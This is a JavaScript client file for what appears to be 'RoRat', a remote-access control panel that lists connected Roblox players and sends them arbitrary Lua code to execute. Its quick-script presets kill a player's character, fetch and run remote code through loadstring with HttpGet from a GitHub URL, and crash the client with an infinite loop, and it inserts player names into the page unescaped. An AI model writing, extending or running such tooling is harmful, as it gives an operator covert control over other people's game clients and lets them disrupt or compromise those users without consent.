const socket = io();
let clients = []; // Array of all connected Lua clients
window.curUser = null;

socket.on("usersUpdated", (data) => {
    data = JSON.parse(data);
    clients = data;
    console.log("usersUpdated");
    console.log("Received message from server: " + JSON.stringify(clients, null, 2));

    var currentUsers = document.querySelectorAll(".user");
    for(var i = 0; i < currentUsers.length; i++){
        if(data.indexOf(currentUsers[i].id) == -1){
            currentUsers[i].remove();
        }
    }
    // if selected user got removed, go back to welcome window
    if(window.curUser != null && data.indexOf(window.curUser.userId) == -1){
        window.curUser = null;
        document.querySelector("#welcomeWindow").style.display = "block";
    document.querySelector("#userWindow").style.display = "none";
    }
    
    for(var i = 0; i < data.length; i++){
        if(document.querySelector(`#${data[i].name}`) == null){
            var user = new User(data[i]);
            document.querySelector("#users").appendChild(user.getElement());
        }
    }
});

class User {
    constructor(opts) {
        this.userId = opts.userId;
        this.name = opts.name;
        this.gameId = opts.gameId;
        this.jobId = opts.jobId;
        this.profilePicture = opts.profilePicture;
        this.gameName = opts.gameName;
    }
    getElement() {
        var elem = document.createElement("div");
        elem.id = this.name;
        elem.className = "user";
        elem.innerHTML = `
                <image class="userImage" src="${this.profilePicture}" alt="User Profile Image"></image>
                <div class="userName">
                    <p>${this.name}</p>
                    <p class="gameName">${this.gameName}</p>
                </div>
        `
        elem.onclick = () => {
            showUser(this)
        }
        return elem;
    }
}

function refresh(){
    
}

function showUser(user){
    console.log("show user " + user.userId)

    document.querySelector("#welcomeWindow").style.display = "none";
    document.querySelector("#userWindow").style.display = "block";

    document.querySelector("h1.userNameBig").innerHTML = user.name;
    document.querySelector(".userImageBig").src = user.profilePicture;
    document.querySelector(".userStatusBig").innerHTML = `${user.gameName}`;

    window.curUser = user;
}

function execute(aceEditor){
    console.log("execute");
    socket.emit("execute", JSON.stringify({
        code: aceEditor.getValue(),
        userId: window.curUser.userId
    }));
}

function clearAce(){
    editor.setValue("--RoRat Beta\n--made by mmccall0813\n\n");
    editor.clearSelection();
}

const quickScripts = {
    "kill": `game:GetService("Players").LocalPlayer.Character.Humanoid.Health = 0`,
    "infyield": `loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()`,
    "crash": `while true do end`, // trollolol
}

function quickScript(opt){
    socket.emit("execute", JSON.stringify({
        code: quickScripts[opt],
        userId: window.curUser.userId
    }));
}